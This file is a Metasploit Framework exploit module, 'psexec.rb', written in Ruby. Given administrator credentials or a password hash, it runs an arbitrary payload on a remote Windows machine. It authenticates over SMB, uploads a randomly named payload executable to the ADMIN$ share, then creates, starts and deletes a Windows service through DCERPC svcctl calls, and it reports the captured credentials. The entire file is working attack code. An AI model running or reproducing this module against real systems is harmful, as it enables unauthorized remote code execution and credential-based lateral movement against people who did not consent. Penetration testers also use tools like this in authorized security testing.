##
# $Id: psexec.rb 11204 2010-12-02 17:29:26Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


=begin
Windows XP systems that are not part of a domain default to treating all
network logons as if they were Guest. This prevents SMB relay attacks from
gaining administrative access to these systems. This setting can be found
under:

	Local Security Settings >
	 Local Policies >
	  Security Options >
	   Network Access: Sharing and security model for local accounts
=end

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Windows Authenticated User Code Execution',
			'Description'    => %q{
					This module uses a valid administrator username and password (or
				password hash) to execute an arbitrary payload. This module	is similar
				to the "psexec" utility provided by SysInternals. Unfortunately, this
				module is not able to clean up after itself. The service and payload
				file listed in the output will need to be manually removed after access
				has been gained. The service created by this tool uses a randomly chosen
				name and description, so the services list can become cluttered after
				repeated exploitation.
			},
			'Author'         =>
				[
					'hdm',
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11204 $',
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'WfsDelay'     => 10,
					'EXITFUNC' => 'process'
				},
			'References'     =>
				[
					[ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
					[ 'OSVDB', '3106'],
					[ 'URL', 'http://www.microsoft.com/technet/sysinternals/utilities/psexec.mspx' ]
				],
			'Payload'        =>
				{
					'Space'        => 2048,
					'DisableNops'  => true,
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			# For the CVE, PsExec was first released around February or March 2001
			'DisclosureDate' => 'Jan 01 1999'
		))

		register_advanced_options(
			[
				OptBool.new('DB_REPORT_AUTH', [true, "Report an auth_note upon a successful connection", true])
			], self.class)
	end

	def exploit

		print_status("Connecting to the server...")
		connect()

		print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
		smb_login()

		if (not simple.client.auth_user)
			print_line(" ")
			print_error(
				"FAILED! The remote host has only provided us with Guest privileges. " +
				"Please make sure that the correct username and password have been provided. " +
				"Windows XP systems that are not part of a domain will only provide Guest privileges " +
				"to network logins by default."
			)
			print_line(" ")
			disconnect
			return
		end

		if datastore['DB_REPORT_AUTH']
			report_hash = {
				:host	=> datastore['RHOST'],
				:port   => datastore['RPORT'],
				:sname	=> 'smb',
				:user	=> datastore['SMBUser'],
				:pass	=> datastore['SMBPass'],
				:active => true
			}
			if datastore['SMBPass'] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
				report_hash.merge!({:type => 'smb_hash'})
			else
				report_hash.merge!({:type => 'password'})
			end
			report_auth_info(report_hash)
		end

		filename = rand_text_alpha(8) + ".exe"
		servicename = rand_text_alpha(8)

		# Upload the shellcode to a file
		print_status("Uploading payload...")
		simple.connect("ADMIN$")
		fd = simple.open("\\#{filename}", 'rwct')

		exe = ''
		opts = { :servicename => servicename }
		if (datastore['PAYLOAD'].include? 'x64')
			opts.merge!({ :arch => ARCH_X64 })
		end
		exe = generate_payload_exe_service(opts)

		fd << exe
		fd.close

		print_status("Created \\#{filename}...")

		# Disconnect from the ADMIN$
		simple.disconnect("ADMIN$")

		# Connect to the IPC service
		simple.connect("IPC$")


		# Bind to the service
		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		##
		# OpenSCManagerW()
		##

		print_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		##
		# CreateServiceW()
		##

		displayname = 'M' + rand_text_alpha(rand(32)+1)
		svc_handle  = nil
		svc_status  = nil

		print_status("Creating a new service (#{servicename} - \"#{displayname}\")...")
		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore

			NDR.wstring("%SYSTEMROOT%\\#{filename}") + # Binary Path
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		##
		# CloseHandle()
		##
		print_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		##
		# OpenServiceW
		##
		print_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		##
		# StartService()
		##
		print_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		##
		# DeleteService()
		##
		print_status("Removing the service...")
		stubdata =
			svc_handle
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		##
		# CloseHandle()
		##
		print_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		begin
			print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			simple.connect("ADMIN$")
			simple.delete("\\#{filename}")
		rescue ::Interrupt
			raise $!
		rescue ::Exception
		end

		handler
		disconnect
	end
end

